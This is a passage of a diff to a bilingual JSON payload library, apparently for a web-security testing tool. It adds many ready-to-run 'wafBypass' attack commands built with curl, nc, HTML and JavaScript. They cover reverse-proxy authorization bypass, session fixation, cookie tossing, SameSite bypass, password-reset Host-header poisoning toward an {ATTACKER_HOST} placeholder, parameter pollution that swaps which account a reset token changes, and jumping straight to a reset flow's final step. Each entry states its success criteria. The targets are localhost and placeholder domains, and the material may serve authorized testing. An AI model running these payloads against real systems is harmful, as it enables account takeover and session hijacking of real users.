+            {
+              "title": {
+                "zh": "绝对 URI 请求形式",
+                "en": "Absolute-URI Request Form"
+              },
+              "command": "printf 'GET http://127.0.0.1:8080/marker HTTP/1.1\\r\\nHost: irrelevant\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 8080",
+              "description": {
+                "zh": "绕过反向代理按 Host/相对路径分流的授权规则：绝对 URI 形式直连命中后端路由。成功判据：返回 marker 内容。",
+                "en": "Bypasses reverse-proxy authorization keyed on Host/relative path by issuing an absolute-URI request that hits the backend route directly. Success: marker content returned."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "GET http://127.0.0.1:8080/marker HTTP/1.1",
+                  "explanation": {
+                    "zh": "绝对 URI 请求行",
+                    "en": "Absolute-URI request line"
+                  },
+                  "type": "control"
+                },
+                {
+                  "part": "Host: irrelevant",
+                  "explanation": {
+                    "zh": "占位 Host 头",
+                    "en": "Placeholder Host header"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "| nc 127.0.0.1 8080",
+                  "explanation": {
+                    "zh": "nc 直连发送",
+                    "en": "Sends raw bytes via nc"
+                  },
+                  "type": "operator"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "分号路径参数",
+                "en": "Semicolon Path Parameter"
+              },
+              "command": "curl -sS --max-time 5 --path-as-is \"http://127.0.0.1:8080/marker;a=1\"",
+              "description": {
+                "zh": "绕过按完整路径匹配的授权：分号后的参数在 Tomcat/Spring 解析时被剥离。成功判据：200 响应。",
+                "en": "Bypasses full-path authorization since Tomcat/Spring strip semicolon parameters during parsing. Success: 200 response."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "curl -sS --max-time 5",
+                  "explanation": {
+                    "zh": "静默限时请求",
+                    "en": "Silent timed request"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "--path-as-is",
+                  "explanation": {
+                    "zh": "禁止路径规范化",
+                    "en": "Disables path normalization"
+                  },
+                  "type": "flag"
+                },
+                {
+                  "part": "\"http://127.0.0.1:8080/marker;a=1\"",
+                  "explanation": {
+                    "zh": "分号参数路径",
+                    "en": "Path with parameter suffix"
+                  },
+                  "type": "url"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -550,7 +1433,217 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "预置会话直登检测",
+                "en": "Preseeded Session Login Probe"
+              },
+              "command": "curl -sS --max-time 5 -b \"session=ATTACKER_PRESET\" -d \"username=payloader&password=PAYLOADER_TEST\" http://127.0.0.1:8080/login -c post.cookies; grep -c \"ATTACKER_PRESET\" post.cookies",
+              "description": {
+                "zh": "绕过登录轮换缺失检测盲区：预置自定义会话 ID 完成登录后检查是否复用。成功判据：post.cookies 中 session 值仍为 ATTACKER_PRESET。",
+                "en": "Tests missing rotation by pre-seeding a custom session ID across login and diffing the jar afterwards. Success: the session value remains ATTACKER_PRESET in post.cookies."
+              }
+            },
+            {
+              "title": {
+                "zh": "URL 参数传递会话",
+                "en": "Session via URL Parameter"
+              },
+              "command": "curl -sS --max-time 5 \"http://127.0.0.1:8080/login?session=ATTACKER_PRESET\" -d \"username=payloader&password=PAYLOADER_TEST\" -c post.cookies",
+              "description": {
+                "zh": "绕过仅接受 Cookie 头传递的假设：会话取自查询参数时同样可固定。成功判据：登录后响应携带同一 session 值。",
+                "en": "Bypasses the assumption that sessions travel only via the Cookie header by seeding through the query string. Success: post-login response carries the same session value."
+              }
+            },
+            {
+              "title": {
+                "zh": "双 Cookie 头注入",
+                "en": "Duplicate Cookie Header Injection"
+              },
+              "command": "printf 'POST /login HTTP/1.1\\r\\nHost: 127.0.0.1:8080\\r\\nCookie: session=A\\r\\nCookie: PHPSESSID=ATTACKER_PRESET\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 38\\r\\n\\r\\nusername=payloader&password=PAYLOADER_TEST\\r\\n' | nc 127.0.0.1 8080",
+              "description": {
+                "zh": "利用多 Cookie 头解析差异注入预置会话并观察取值优先级。成功判据：固定会话被服务端接受。",
+                "en": "Exploits duplicate Cookie header parsing differences to seed a preset session. Success: the server accepts the fixed session."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "POST /login HTTP/1.1",
+                  "explanation": {
+                    "zh": "POST 请求行",
+                    "en": "POST request line"
+                  },
+                  "type": "control"
+                },
+                {
+                  "part": "Cookie: session=A",
+                  "explanation": {
+                    "zh": "首个会话头",
+                    "en": "First session cookie"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "Cookie: PHPSESSID=ATTACKER_PRESET",
+                  "explanation": {
+                    "zh": "第二个会话头",
+                    "en": "Second session cookie"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "Content-Length: 38",
+                  "explanation": {
+                    "zh": "声明体长度",
+                    "en": "Declared body length"
+                  },
+                  "type": "header"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "URL 传参固定",
+                "en": "URL Parameter Seeding"
+              },
+              "command": "curl -sS --max-time 5 \"http://127.0.0.1:8080/login?PHPSESSID=attacker_known_session\" -d \"username=payloader&password=PAYLOADER_TEST\" -c fixed.cookies; grep -c attacker_known_session fixed.cookies",
+              "description": {
+                "zh": "会话标识经查询参数固定，登录后未轮换即成立。成功判据：登录后 Cookie 值仍为预设值。",
+                "en": "Seeding the session id via query string; success if not rotated after login. Success: the cookie value stays at the preset after login."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "?PHPSESSID=attacker_known_session",
+                  "explanation": {
+                    "zh": "查询参数固定会话",
+                    "en": "Query-param session fixation"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "-d \"username=payloader&password=PAYLOADER_TEST\"",
+                  "explanation": {
+                    "zh": "合成登录凭据",
+                    "en": "Synthetic credentials"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "grep -c attacker_known_session fixed.cookies",
+                  "explanation": {
+                    "zh": "检查会话复用",
+                    "en": "Checks session reuse"
+                  },
+                  "type": "function"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "双 Cookie 叠加固定",
+                "en": "Cookie Stacking Fixation"
+              },
+              "command": "curl -sS --max-time 5 -b \"PHPSESSID=attacker_known_session; JSESSIONID=attacker_known_session\" -d \"username=payloader&password=PAYLOADER_TEST\" http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "多框架 Cookie 并存，任一未轮换即固定成功。成功判据：任一框架登录后复用预设值。",
+                "en": "Multiple framework cookies coexist; any one not rotated means fixation. Success: any framework reuses the preset value after login."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-b \"PHPSESSID=attacker_known_session; JSESSIONID=attacker_known_session\"",
+                  "explanation": {
+                    "zh": "多框架 Cookie 并存",
+                    "en": "Coexisting framework cookies"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/login",
+                  "explanation": {
+                    "zh": "登录端点",
+                    "en": "Login endpoint"
+                  },
+                  "type": "url"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "编码会话值固定",
+                "en": "Encoded Session Value"
+              },
+              "command": "curl -sS --max-time 5 -b \"PHPSESSID=%61ttacker_known_session\" -d \"username=payloader&password=PAYLOADER_TEST\" http://127.0.0.1:8080/login",
+              "description": {
+                "zh": "编码值在解码层还原，绕过固定检测特征。成功判据：解码后预设会话被接受。",
+                "en": "Encoded values resolve at the decode layer, evading fixation-detection signatures. Success: the decoded preset session is accepted."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "PHPSESSID=%61ttacker_known_session",
+                  "explanation": {
+                    "zh": "编码预设会话",
+                    "en": "Encoded preset session"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "%61",
+                  "explanation": {
+                    "zh": "编码字母 a",
+                    "en": "Encoded letter a"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "session_id预设 (Session Fixation)",
+                "en": "Validation step 1 for Preset Session ID Session Fixation"
+              },
+              "command": "PHPSESSID=attacker_known_session\nJSESSIONID=attacker_known_session\nASP.NET_SessionId=attacker_known_session\nconnect.sid=attacker_known_session\nsid=attacker_known_session\nsession=attacker_known_session\n_sess=attacker_known_session\n_session_id=attacker_known_session\n_sessionid=attacker_known_session\napp_session=attacker_known_session\nuser_session=attacker_known_session\nauth_session=attacker_known_session\ntoken=attacker_known_token",
+              "description": {
+                "zh": "把预设会话 ID 逐条置于请求并在认证后复用；服务端沿用攻击者预设 ID，即确认会话固定。",
+                "en": "Place each preset session ID into the request and reuse it after authentication; the server keeping the attacker-preset ID confirms session fixation."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "PHPSESSID=attacker_known_session",
+                  "explanation": {
+                    "zh": "PHP 预设会话",
+                    "en": "PHP preset session"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "JSESSIONID=attacker_known_session",
+                  "explanation": {
+                    "zh": "Java 预设会话",
+                    "en": "Java preset session"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "ASP.NET_SessionId=attacker_known_session",
+                  "explanation": {
+                    "zh": "ASP.NET 预设会话",
+                    "en": "ASP.NET preset session"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "token=attacker_known_token",
+                  "explanation": {
+                    "zh": "预设令牌参数",
+                    "en": "Preset token param"
+                  },
+                  "type": "payload"
+                }
+              ],
+              "platform": "all",
+              "requiresAdmin": false
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -571,10 +1664,7 @@
                 "zh": "只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。",
                 "en": "Run only the first sample in this validation card while keeping the account, session, and target object unchanged."
               },
-              "payloadRef": {
-                "area": "execution",
-                "index": 0
-              }
+              "payload": "curl -sS --max-time 5 -c prelogin.cookies http://127.0.0.1:8080/\npre_hash=$(sha256sum prelogin.cookies | cut -d\" \" -f1)\ncurl -sS --max-time 5 -b prelogin.cookies -c postlogin.cookies -d \"user=payloader&pass=PAYLOADER_TEST\" http://127.0.0.1:8080/login\npost_hash=$(sha256sum postlogin.cookies | cut -d\" \" -f1)\nprintf \"pre=%s post=%s\\n\" \"$pre_hash\" \"$post_hash\"\ncurl -sS --max-time 5 -b postlogin.cookies http://127.0.0.1:8080/marker\n# Expected: the authenticated session identifier rotates and only the post-login jar reaches the marker."
             },
             {
               "title": {
@@ -633,7 +1723,103 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "父子路径同名覆盖",
+                "en": "Parent-Child Path Override"
+              },
+              "command": "document.cookie=\"payloader_toss=x; Path=/\"; document.cookie=\"payloader_toss=x; Path=/lab/nested/path\";",
+              "description": {
+                "zh": "绕过按单一路径读取 Cookie 的逻辑：父子路径同名 Cookie 并存干扰服务端取值。成功判据：请求头中出现两个同名 Cookie 且解析取到攻击者值。",
+                "en": "Bypasses single-path cookie reads by co-locating the same name on parent and child paths. Success: request carries both cookies and the attacker value wins."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "document.cookie=\"payloader_toss=x; Path=/\";",
+                  "explanation": {
+                    "zh": "写入根路径 Cookie",
+                    "en": "Sets root-path cookie"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "Path=/lab/nested/path",
+                  "explanation": {
+                    "zh": "深层子路径",
+                    "en": "Deep subpath"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "payloader_toss",
+                  "explanation": {
+                    "zh": "同名 Cookie 键",
+                    "en": "Same cookie name"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "Domain 作用域扩张",
+                "en": "Domain Scope Expansion"
+              },
+              "command": "document.cookie=\"payloader_toss=x; Domain=.example.invalid; Path=/\";",
+              "description": {
+                "zh": "扩大同名 Cookie 作用域干扰子域/父域解析顺序。成功判据：子域请求携带投递的 Cookie。",
+                "en": "Widens the duplicate cookie's scope to interfere with subdomain parsing order. Success: subdomain requests carry the tossed cookie."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "document.cookie=\"payloader_toss=x; Domain=.example.invalid; Path=/\";",
+                  "explanation": {
+                    "zh": "写父域 Cookie",
+                    "en": "Sets parent-domain cookie"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "Domain=.example.invalid",
+                  "explanation": {
+                    "zh": "父域作用域",
+                    "en": "Parent-domain scope"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "编码 Cookie 名",
+                "en": "Encoded Cookie Name"
+              },
+              "command": "document.cookie=\"payloader%5Ftoss=x; Path=/\";",
+              "description": {
+                "zh": "绕过按名称精确匹配的清理/校验逻辑：百分号编码下划线。成功判据：同名逻辑键被双重写入。",
+                "en": "Bypasses name-exact cleanup logic by percent-encoding the underscore in the name. Success: the logical key gets written twice."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "payloader%5Ftoss=x",
+                  "explanation": {
+                    "zh": "编码下划线名",
+                    "en": "Encoded underscore name"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "%5F",
+                  "explanation": {
+                    "zh": "下划线编码",
+                    "en": "Encoded underscore"
+                  },
+                  "type": "value"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -684,8 +1870,8 @@
         {
           "id": "auth-samesite-navigation",
           "name": {
-            "zh": "SameSite 导航边界",
-            "en": "SameSite Navigation Boundary"
+            "zh": "SameSite Cookie 绕过",
+            "en": "SameSite Cookie Bypass"
           },
           "description": {
             "zh": "以顶级导航、子资源、弹窗回调等场景携带 Cookie，验证 SameSite 属性在各路径下的实际拦截边界。",
@@ -716,7 +1902,95 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "meta refresh 导航",
+                "en": "Meta-Refresh Navigation"
+              },
+              "command": "<meta http-equiv=\"refresh\" content=\"0;url=https://app.example.invalid/marker\">",
+              "description": {
+                "zh": "绕过仅拦截链接点击场景的防护：meta refresh 同属顶级导航，Lax Cookie 照常附带。成功判据：目标站收到携带会话的请求。",
+                "en": "Bypasses link-click-only defenses since meta refresh is still top-level navigation and Lax cookies attach. Success: target receives the cookied request."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "<meta http-equiv=\"refresh\" content=\"0;url=https://app.example.invalid/marker\">",
+                  "explanation": {
+                    "zh": "meta 刷新导航",
+                    "en": "Meta refresh navigation"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "content=\"0;url=",
+                  "explanation": {
+                    "zh": "立即跳转",
+                    "en": "Immediate redirect"
+                  },
+                  "type": "value"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "GET 表单自动提交",
+                "en": "Auto-Submitted GET Form"
+              },
+              "command": "<form action=\"https://app.example.invalid/marker\" method=\"get\"></form><script>document.forms[0].submit()</script>",
+              "description": {
+                "zh": "绕过对 <a> 标签的过滤：脚本提交 GET 表单仍属顶级导航。成功判据：导航请求携带会话 Cookie。",
+                "en": "Bypasses <a>-tag filtering since a scripted GET form submission is still top-level navigation. Success: navigated request carries the session cookie."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "<form action=\"https://app.example.invalid/marker\" method=\"get\"></form>",
+                  "explanation": {
+                    "zh": "GET 表单",
+                    "en": "GET form"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "document.forms[0].submit()",
+                  "explanation": {
+                    "zh": "脚本提交表单",
+                    "en": "Script submits the form"
+                  },
+                  "type": "function"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "window.open 自目标变形",
+                "en": "window.open Self-Target Variant"
+              },
+              "command": "<script>window.open(\"https://app.example.invalid/marker\",\"_self\")</script>",
+              "description": {
+                "zh": "绕过弹窗拦截与 iframe 限制：_self 目标强制当前窗口导航。成功判据：请求日志记录到会话携带的访问。",
+                "en": "Bypasses popup blockers by targeting _self to force current-window navigation. Success: access logs show the cookied request."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "window.open(\"https://app.example.invalid/marker\",\"_self\")",
+                  "explanation": {
+                    "zh": "自身窗口导航",
+                    "en": "Navigates same window"
+                  },
+                  "type": "function"
+                },
+                {
+                  "part": "\"_self\"",
+                  "explanation": {
+                    "zh": "当前窗口目标",
+                    "en": "Self target"
+                  },
+                  "type": "value"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -892,7 +2166,251 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "双 Host 头注入",
+                "en": "Duplicate Host Header Injection"
+              },
+              "command": "printf 'POST /forgot-password HTTP/1.1\\r\\nHost: app.example.invalid\\r\\nHost: callback.example.invalid\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 35\\r\\n\\r\\nemail=payloader-user@example.invalid\\r\\n' | nc 127.0.0.1 8080",
+              "description": {
+                "zh": "绕过单 Host 校验与部分代理的重复头拦截：双 Host 头拼接后派生重置链接。成功判据：邮件链接指向 callback 域。",
+                "en": "Bypasses single-Host validation via duplicate Host headers that some proxies concatenate when deriving the reset link. Success: emailed link points to the callback domain."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "POST /forgot-password HTTP/1.1",
+                  "explanation": {
+                    "zh": "原始报文请求行",
+                    "en": "Raw request line"
+                  },
+                  "type": "control"
+                },
+                {
+                  "part": "Host: app.example.invalid\\r\\nHost: callback.example.invalid",
+                  "explanation": {
+                    "zh": "双 Host 头",
+                    "en": "Duplicate Host headers"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "Content-Length: 35",
+                  "explanation": {
+                    "zh": "声明体长度",
+                    "en": "Declared body length"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "| nc 127.0.0.1 8080",
+                  "explanation": {
+                    "zh": "nc 直连发送",
+                    "en": "Sends raw bytes via nc"
+                  },
+                  "type": "operator"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "X-Forwarded-Host 替代",
+                "en": "X-Forwarded-Host Alternative"
+              },
+              "command": "curl -sS --max-time 5 -H \"X-Forwarded-Host: callback.example.invalid\" -d \"email=payloader-user@example.invalid\" http://127.0.0.1:8080/forgot-password",
+              "description": {
+                "zh": "绕过对 Host 头的清洗：链接主机派生自 X-Forwarded-Host。成功判据：重置链接域名为 callback。",
+                "en": "Bypasses Host sanitization when the link host derives from X-Forwarded-Host. Success: reset link domain is the callback host."
+              }
+            },
+            {
+              "title": {
+                "zh": "绝对 URI 变形",
+                "en": "Absolute-URI Variant"
+              },
+              "command": "printf 'POST http://callback.example.invalid/forgot-password HTTP/1.1\\r\\nHost: app.example.invalid\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 35\\r\\n\\r\\nemail=payloader-user@example.invalid\\r\\n' | nc 127.0.0.1 8080",
+              "description": {
+                "zh": "利用代理优先取绝对 URI 主机的差异投毒链接。成功判据：发出的重置邮件使用 callback 域。",
+                "en": "Poisons the link by exploiting proxies that prefer the absolute-URI host. Success: the reset mail uses the callback domain."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "POST http://callback.example.invalid/forgot-password HTTP/1.1",
+                  "explanation": {
+                    "zh": "绝对 URI 请求行",
+                    "en": "Absolute-URI request line"
+                  },
+                  "type": "control"
+                },
+                {
+                  "part": "Host: app.example.invalid",
+                  "explanation": {
+                    "zh": "合法 Host 头",
+                    "en": "Legitimate Host header"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "| nc 127.0.0.1 8080",
+                  "explanation": {
+                    "zh": "nc 直连发送",
+                    "en": "Sends raw bytes via nc"
+                  },
+                  "type": "operator"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "双 Host 投毒",
+                "en": "Dual-Host Poisoning"
+              },
+              "command": "printf 'POST /forgot-password HTTP/1.1\\r\\nHost: app.example.invalid\\r\\nHost: {ATTACKER_HOST}\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 35\\r\\n\\r\\nemail=payloader-user@example.invalid\\r\\n' | nc 127.0.0.1 8080",
+              "description": {
+                "zh": "双 Host 头拼接后重置链接派生为攻击者域。成功判据：邮件链接指向 {ATTACKER_HOST}。",
+                "en": "Concatenated duplicate Host headers derive the reset link to the attacker domain. Success: the emailed link points at {ATTACKER_HOST}."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "Host: app.example.invalid\\r\\nHost: {ATTACKER_HOST}",
+                  "explanation": {
+                    "zh": "双 Host 头",
+                    "en": "Duplicate Host headers"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "Content-Length: 35",
+                  "explanation": {
+                    "zh": "声明体长度",
+                    "en": "Declared body length"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "| nc 127.0.0.1 8080",
+                  "explanation": {
+                    "zh": "nc 直连发送",
+                    "en": "Sends raw bytes via nc"
+                  },
+                  "type": "operator"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "组合转发主机头",
+                "en": "Combined Forwarded Host"
+              },
+              "command": "curl -sS --max-time 5 -H \"Host: app.example.invalid\" -H \"X-Forwarded-Host: {ATTACKER_HOST}\" -d \"email=payloader-user@example.invalid\" http://127.0.0.1:8080/forgot-password",
+              "description": {
+                "zh": "Host 合法而 X-Forwarded-Host 携带攻击者域，派生优先级被滥用。成功判据：链接域名变为攻击者域。",
+                "en": "A legit Host with a poisoned X-Forwarded-Host abuses derivation priority. Success: the link domain flips to the attacker host."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "-H \"Host: app.example.invalid\"",
+                  "explanation": {
+                    "zh": "合法 Host 头",
+                    "en": "Legitimate Host header"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "-H \"X-Forwarded-Host: {ATTACKER_HOST}\"",
+                  "explanation": {
+                    "zh": "攻击者转发主机头",
+                    "en": "Attacker forwarded host"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "http://127.0.0.1:8080/forgot-password",
+                  "explanation": {
+                    "zh": "重置端点",
+                    "en": "Reset endpoint"
+                  },
+                  "type": "url"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "绝对 URI 投毒",
+                "en": "Absolute-URI Poisoning"
+              },
+              "command": "printf 'POST http://{ATTACKER_HOST}/forgot-password HTTP/1.1\\r\\nHost: app.example.invalid\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 35\\r\\n\\r\\nemail=payloader-user@example.invalid\\r\\n' | nc 127.0.0.1 8080",
+              "description": {
+                "zh": "绝对 URI 中的主机被优先用于链接派生。成功判据：重置链接使用攻击者域。",
+                "en": "The absolute-URI host takes precedence for link derivation. Success: the reset link uses the attacker domain."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "POST http://{ATTACKER_HOST}/forgot-password HTTP/1.1",
+                  "explanation": {
+                    "zh": "绝对 URI 请求行",
+                    "en": "Absolute-URI request line"
+                  },
+                  "type": "control"
+                },
+                {
+                  "part": "Host: app.example.invalid",
+                  "explanation": {
+                    "zh": "合法 Host 头",
+                    "en": "Legitimate Host header"
+                  },
+                  "type": "header"
+                },
+                {
+                  "part": "Content-Length: 35",
+                  "explanation": {
+                    "zh": "声明体长度",
+                    "en": "Declared body length"
+                  },
+                  "type": "header"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "密码重置投毒 (Host: evil.com)",
+                "en": "Validation step 1 for Password Reset Host Header Poisoning"
+              },
+              "command": "{ATTACKER_HOST}\n{ATTACKER_HOST}:443\n{ATTACKER_HOST}:80\n{ATTACKER_HOST}:8080\n{ATTACKER_HOST}:8443\n{ATTACKER_HOST}:3000\n{ATTACKER_HOST}:5000\n{ATTACKER_HOST}:9000\n{ATTACKER_HOST}:9090\n{ATTACKER_HOST}\n{ATTACKER_HOST}:443\n{ATTACKER_HOST}\n{ATTACKER_HOST}:443\n{ATTACKER_HOST}\n{ATTACKER_HOST}\n{ATTACKER_HOST}\n{ATTACKER_HOST}\n{ATTACKER_HOST}/path\n{ATTACKER_HOST}/reset\n{ATTACKER_HOST}/token\n{ATTACKER_HOST}/password",
+              "description": {
+                "zh": "把外部域列表逐条置于 Host 头注入密码重置请求；重置链接指向注入域，即确认重置链接主机派生可操纵。",
+                "en": "Place each external-domain entry into the Host header of password-reset requests; reset links pointing at the injected domain confirms manipulable host-derived link generation."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "{ATTACKER_HOST}:443",
+                  "explanation": {
+                    "zh": "攻击域加端口",
+                    "en": "Attacker host with port"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "{ATTACKER_HOST}/reset",
+                  "explanation": {
+                    "zh": "攻击域重置路径",
+                    "en": "Attacker reset path"
+                  },
+                  "type": "value"
+                },
+                {
+                  "part": "{ATTACKER_HOST}",
+                  "explanation": {
+                    "zh": "攻击域基线值",
+                    "en": "Attacker host baseline"
+                  },
+                  "type": "value"
+                }
+              ],
+              "platform": "all",
+              "requiresAdmin": false
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -913,10 +2431,7 @@
                 "zh": "只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。",
                 "en": "Run only the first sample in this validation card while keeping the account, session, and target object unchanged."
               },
-              "payloadRef": {
-                "area": "execution",
-                "index": 0
-              }
+              "payload": "POST /forgot-password HTTP/1.1\nHost: callback.example.invalid\nContent-Type: application/x-www-form-urlencoded\n\nemail=payloader-user%40example.invalid\n\nPOST /forgot-password HTTP/1.1\nHost: app.example.invalid\nX-Forwarded-Host: callback.example.invalid\nContent-Type: application/x-www-form-urlencoded\n\nemail=payloader-user%40example.invalid\n# Inspect only the local mail-sandbox link; no real recipient or external collaborator."
             },
             {
               "title": {
@@ -976,7 +2491,95 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "参数污染切换账户",
+                "en": "Parameter-Pollution Account Swap"
+              },
+              "command": "curl -sS --max-time 5 -d \"token=PAYLOADER_TEST_TOKEN&token=PAYLOADER_TEST_TOKEN&account=payloader-a&account=payloader-b&new_password=PAYLOADER_MARKER\" http://127.0.0.1:8080/test/reset",
+              "description": {
+                "zh": "利用前后端取参差异将令牌绑定到他人账户。成功判据：payloader-b 的口令被修改而令牌属 payloader-a。",
+                "en": "Uses front/back-end parameter extraction divergence to bind the token to another account. Success: payloader-b password changes with payloader-a token."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "token=PAYLOADER_TEST_TOKEN&token=PAYLOADER_TEST_TOKEN",
+                  "explanation": {
+                    "zh": "重复令牌参数",
+                    "en": "Duplicated token params"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "account=payloader-a&account=payloader-b",
+                  "explanation": {
+                    "zh": "重复账号参数",
+                    "en": "Duplicated account params"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "JSON 双键覆盖",
+                "en": "JSON Duplicate-Key Override"
+              },
+              "command": "curl -sS --max-time 5 -H \"Content-Type: application/json\" -d '{\"token\":\"PAYLOADER_TEST_TOKEN\",\"account\":\"payloader-a\",\"account\":\"payloader-b\",\"new_password\":\"PAYLOADER_MARKER\"}' http://127.0.0.1:8080/test/reset",
+              "description": {
+                "zh": "绕过表单层校验：JSON.parse 后键覆盖顺序差异实现账户切换。成功判据：目标账户口令被改。",
+                "en": "Bypasses form-layer validation; JSON.parse key-overwrite order swaps the account. Success: target account password changes."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "\"account\":\"payloader-a\",\"account\":\"payloader-b\"",
+                  "explanation": {
+                    "zh": "重复 JSON 账号键",
+                    "en": "Duplicated JSON account keys"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "-H \"Content-Type: application/json\"",
+                  "explanation": {
+                    "zh": "JSON 请求体类型",
+                    "en": "JSON body content type"
+                  },
+                  "type": "header"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "大小写键名变体",
+                "en": "Case-Variant Keys"
+              },
+              "command": "curl -sS --max-time 5 -H \"Content-Type: application/json\" -d '{\"Token\":\"PAYLOADER_TEST_TOKEN\",\"Account\":\"payloader-b\",\"new_password\":\"PAYLOADER_MARKER\"}' http://127.0.0.1:8080/test/reset",
+              "description": {
+                "zh": "绕过严格小写键白名单的后端取参映射。成功判据：大写键仍被解析并完成重置。",
+                "en": "Bypasses strict lowercase key whitelisting in backend parameter mapping. Success: capitalized keys still drive the reset."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "\"Token\":\"PAYLOADER_TEST_TOKEN\"",
+                  "explanation": {
+                    "zh": "大写令牌键",
+                    "en": "Capitalized token key"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "\"Account\":\"payloader-b\"",
+                  "explanation": {
+                    "zh": "大写账号键",
+                    "en": "Capitalized account key"
+                  },
+                  "type": "payload"
+                }
+              ]
+            }
+          ],
           "attackChain": [
             {
               "title": {
@@ -1060,7 +2663,95 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": [],
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "末步端点直跳",
+                "en": "Final-Step Endpoint Jump"
+              },
+              "command": "curl -sS --max-time 5 -d \"account=payloader-a&new_password=PAYLOADER_MARKER\" http://127.0.0.1:8080/test/reset-final",
+              "description": {
+                "zh": "绕过流程状态机：直接请求末步端点跳过中间校验。成功判据：无令牌情况下口令被修改。",
+                "en": "Bypasses the flow state machine by hitting the final step directly. Success: password changes without any token."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "http://127.0.0.1:8080/test/reset-final",
+                  "explanation": {
+                    "zh": "末步端点",
+                    "en": "Final-step endpoint"
+                  },
